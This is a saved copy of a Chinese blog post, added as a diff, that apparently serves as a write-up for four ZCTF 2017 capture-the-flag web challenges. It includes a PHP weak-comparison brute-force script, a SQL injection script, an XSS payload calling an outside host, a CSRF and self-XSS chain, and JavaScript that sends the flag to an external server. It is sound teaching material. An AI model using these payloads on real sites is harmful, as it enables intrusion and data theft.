@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<!-- saved from url=(0053)https://blog.cal1.cn/post/ZCTF%202017%20web%20writeup -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ZCTF 2017 web writeup - crblog</title>
+    
+    <!--<link href="//cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">-->
+    <link href="./ZCTF 2017 web writeup - crblog_files/bootstrap.min.css" rel="stylesheet">
+    <link href="./ZCTF 2017 web writeup - crblog_files/yue.css" rel="stylesheet">
+    <link href="./ZCTF 2017 web writeup - crblog_files/style.css" rel="stylesheet">
+    <link rel="shortcut icon" type="image/png" href="https://blogstatic-1252090343.cosgz.myqcloud.com/h1209.png">
+</head>
+<body>
+<nav class="navbar navbar-default navbar-static-top">
+    <div class="container">
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse" aria-expanded="false">
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="https://blog.cal1.cn/">crblog</a>
+        </div>
+        <div class="collapse navbar-collapse" id="navbar-collapse">
+            <ul class="nav navbar-nav">
+                <li><a href="https://blog.cal1.cn/">主页</a></li>
+                <li><a href="https://blog.cal1.cn/archive">归档</a></li>
+            </ul>
+            <ul class="nav navbar-nav navbar-right">
+                <li><a href="https://blog.cal1.cn/link">关于</a></li>
+            </ul>
+        </div>
+    </div>
+</nav>
+<div class="container yue">
+    
+    <div class="page-header">
+        <h1>ZCTF 2017 web writeup</h1><span>发表于 2017年3月1日</span>
+    </div>
+    
+        <h2>web100</h2>
+<p><code>.index.php.swp</code> 有源码：</p>
+<pre><code class="php">&lt;?php
+$flag = $_GET['flag'];
+if ($flag != '15562') {
+    if (strstr($flag, 'zctf')) {
+        var_dump(substr(md5('15562'),8,16)); // 0e46379442318098
+        if (substr(md5($flag),8,16) == substr(md5('15562'),8,16)) {
+            die('ZCTF');
+        }
+    }
+}
+die('ha?')
+?&gt;
+</code></pre>
+
+<p>php 两个等号弱类型比较，跑出 <code>^0e\d+$</code> 就行：</p>
+<pre><code class="python">from hashlib import md5
+from random import randint
+from re import findall
+while 1:
+        s = 'zctf' + str(randint(1e10, 1e12))
+        if len(findall('^0e\d+$', md5(s).hexdigest()[8:8+16])):
+                print s
+</code></pre>
+
+<h2>find my eyes</h2>
+<p>查看源码可知整站用 <code>HTTrack Website Copier/3.x</code> 从某素材站复制而来，对比发现 <code>contact.php</code> 的表单目标 <code>message.php</code> 对输入内容进行了校验。观察到 <code>index.php</code> 有CSP 头，猜测在 <code>message.php</code> 提交内容进行信息刺探或 XSS 。
+表单的 <code>textarea</code> 过滤了许多字符和关键词，最终使用如下 payload 监听到请求，flag 在 UA 头中。</p>
+<pre><code>&lt;script&gt;//@ sourceMappingURL=http://host&lt;/script&gt;
+</code></pre>
+
+<h2>easy apk</h2>
+<p>空格哥哥黑盒摸出了加密方式</p>
+<pre><code class="python">def encode(s):
+    s = s[::-1]
+    key = [ord(i) for i in '1470'*1000]
+    out = ''
+    for i in xrange(len(s)):
+        out += chr(ord(s[i]) ^ key[i])
+    return out.encode('hex')
+</code></pre>
+
+<p>反编译分析可知在 <code>index.php</code> 登录成功后，发往 <code>mail.php</code> 的请求并没有带上登录成功的 Cookie , 而是带上了登录时的用户名与密码，可以推测必须先在登录处注入得到正确的密码。</p>
+<p>注入用的脚本：</p>
+<pre><code class="python">import requests
+def encode(s):
+    s = s[::-1]
+    key = [ord(i) for i in '1470'*1000]
+    out = ''
+    for i in xrange(len(s)):
+        out += chr(ord(s[i]) ^ key[i])
+    return out.encode('hex')
+try:
+    for i in '0123456789abcdef':
+        r = requests.post('http://58.213.63.30:10005/index.php',
+            timeout=3,
+            data={
+            'username': encode("'union/*\x0d\x0a*/select * from user union/*\x0d\x0a*/select '123', '456', '5af1ab27b1be8bb8e39bdf98cd2cfce4%s' order by 3#"%(i)), 
+            'password': ''
+        })
+        print  i, r.content
+except:
+    pass
+</code></pre>
+
+<p>得到密码 <code>CleverBoy123</code>，向 <code>mail.php</code> 打 phpmailer CVE-2016-10033 的 payload, 往 <code>/var/www/html/upload</code> 目录写入 php 文件即可。访问写入的文件获得 flag。</p>
+<h2>onlymyself</h2>
+<p>profile 处有 selfxss，不检查 csrfToken, 双写绕过简单过滤；</p>
+<p>submit bug 提交的 url 会被管理员访问；</p>
+<p>note 处只显示最新的6条note；</p>
+<p>search 在全部的note中搜索，只返回找到的条数。</p>
+<p>综上，利用链：管理员访问页面 a.html，其中包含两个iframe，第一个通过 csrf POST 在自己的 profile 中构造 selfxss，第二个访问 index.php 触发 selfxss。这样即可实现在目标域执行恶意 js 代码。</p>
+<p>a.html:</p>
+<pre><code class="html">&lt;iframe src=b.html&gt;&lt;/iframe&gt;
+&lt;iframe src=http://58.213.63.30:10003/index.php&gt;&lt;/iframe&gt;
+</code></pre>
+
+<p>b.html:</p>
+<pre><code class="html">&lt;script src=http://58.213.63.30:10003/js/jquery-2.2.4.min.js&gt;&lt;/script&gt;
+&lt;form method=POST action="http://58.213.63.30:10003/checkProfile.php"&gt;
+    &lt;input name="nick" value="&lt;scripSCRIPTt src=//x.cal1.cn/c.js&gt;/*"&gt;
+    &lt;input name="address" value="*/&lt;/scripSCRIPTt&gt;"&gt;
+&lt;/form&gt;
+&lt;script&gt;$('body &gt; form').submit()&lt;/script&gt;
+</code></pre>
+
+<p>云屿写的 c.js 负责在 search.php 中搜索 <code>zctf{</code> 来逐位获得 flag 并发回:</p>
+<pre><code class="js">run ('zctf');
+function run(data){
+    var i
+    var str = '{}0123456789abcdefghijklmnopqrstuvwxyz_';
+    for(i = 0; i &lt; 39; ++i){
+        temp = data + str[i];
+        $.ajaxSetup({  
+            async : false  
+        });
+        $.get('http://58.213.63.30:10003/search.php?keywords=' + temp, function(html){
+            if(html.search('exists')){
+                $.get('http://x.cal1.cn:62001/?data=' + temp);
+                run(temp);
+            }
+        });
+    }
+    $.get('http://x.cal1.cn:62001/?over=' + data);
+} 
+</code></pre>
+    
+
+</div>
+<footer class="footer">
+    <div class="container">
+        <div class="footer-collapse">
+            <span>chromium1337 # 2017</span>
+        </div>
+    </div>
+</footer>
+<script src="./ZCTF 2017 web writeup - crblog_files/jquery.min.js"></script>
+<script src="./ZCTF 2017 web writeup - crblog_files/bootstrap.min.js"></script>
+
+
+</body></html>
